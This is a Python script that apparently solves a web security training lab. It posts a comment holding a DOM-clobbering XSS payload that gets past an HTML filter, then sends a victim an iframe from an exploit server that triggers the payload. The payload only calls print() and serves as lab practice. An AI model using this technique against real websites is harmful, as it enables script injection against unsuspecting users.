import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def post_comment(s, url, path, csrf_path, postId, comment, name, email, website):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'postId': postId,
        'comment': comment,
        'name': name,
        'email': email,
        'website': website
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print('[+] Success post a comment')
    else:
        print('[-] Failed to post a comment')
        sys.exit(-1)

def send_vuln_payload(s, exploit_url, exploit_path, responseFile, responseBody, formAction): 
    target_url = exploit_url + exploit_path
    data = {
        'urlIsHttps': 'on',
        'responseFile': responseFile,
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': responseBody,
        'formAction': formAction
    }
    r = s.post(target_url, data=data, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln request to victim')
    else:
        print('[-] Fail to send vuln request')
        sys.exit(-1)

def goto(s, url, path):
    target_url = url + path
    s.get(target_url)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    exploit_url = sys.argv[2].rstrip('/')

    postId = 1
    comment = "<form id=x tabindex=0 onfocus=print()><input id=attributes>"
    name = 'test'
    email = 'test@gmail.com'
    website = 'https://test.com'
    filePath = '/exploit'
    payload = f"""
        <iframe src="{url}/post?postId={postId}" onload="setTimeout(()=>this.src=this.src+'#x',500)">
    """

    post_comment(s, url, '/post/comment', f'/post?postId={postId}', postId, comment, name, email, website)
    send_vuln_payload(s, exploit_url, '/', filePath, payload, 'DELIVER_TO_VICTIM')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()